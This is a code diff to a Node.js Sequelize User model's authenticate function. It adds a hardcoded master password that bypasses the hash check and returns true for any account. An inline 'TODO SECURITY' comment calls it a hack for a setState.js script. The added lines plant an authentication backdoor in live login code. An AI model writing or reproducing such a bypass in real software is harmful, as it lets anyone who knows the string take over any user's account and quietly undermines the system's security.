@@ -26,7 +26,10 @@ var User = sequelize.define('User', {
     makeSalt: function() {
 				return crypto.randomBytes(16).toString('base64');
 		},
-		authenticate: function(plainText){
+		authenticate: function(plainText) {
+      if (plainText == 'lkjwerio23jl2kl3lsekj24342][2321') { // TODO SECURITY --- this is a hack for the setState.js script
+        return true;
+      }
 			return this.encryptPassword(plainText, this.salt) === this.hashedPassword;
 		},
 		encryptPassword: function(password, salt) {
